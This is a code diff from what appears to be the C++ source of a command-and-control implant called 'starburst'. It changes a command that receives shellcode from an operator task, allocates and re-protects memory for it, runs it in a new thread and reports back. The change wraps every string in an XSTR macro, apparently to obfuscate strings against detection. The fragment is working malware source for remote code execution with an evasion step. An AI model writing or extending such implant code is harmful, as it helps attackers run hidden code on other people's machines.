@@ -20,7 +20,7 @@ auto declfn starburst::cmd_execute_pic(
 
     if ( !pic_data || pic_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no PIC data provided" ) ) );
+            XSTR( "no PIC data provided" ) );
         return;
     }
 
@@ -32,7 +32,7 @@ auto declfn starburst::cmd_execute_pic(
 
     if ( !mem ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "VirtualAlloc failed" ) ) );
+            XSTR( "VirtualAlloc failed" ) );
         return;
     }
 
@@ -49,7 +49,7 @@ auto declfn starburst::cmd_execute_pic(
     if ( !pVirtualProtect ) {
         inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "VirtualProtect resolve failed" ) ) );
+            XSTR( "VirtualProtect resolve failed" ) );
         return;
     }
 
@@ -63,18 +63,18 @@ auto declfn starburst::cmd_execute_pic(
     if ( !h_thread ) {
         inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateThread failed" ) ) );
+            XSTR( "CreateThread failed" ) );
         return;
     }
 
     inst.kernel32.CloseHandle( h_thread );
 
     char msg[64] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "executed " ) ) );
+    str_copy( msg, XSTR( "executed " ) );
     char num[16];
     int_to_str( num, pic_len, 10 );
     str_concat( msg, num );
-    str_concat( msg, symbol<char*>( const_cast<char*>( " bytes PIC" ) ) );
+    str_concat( msg, XSTR( " bytes PIC" ) );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
 }
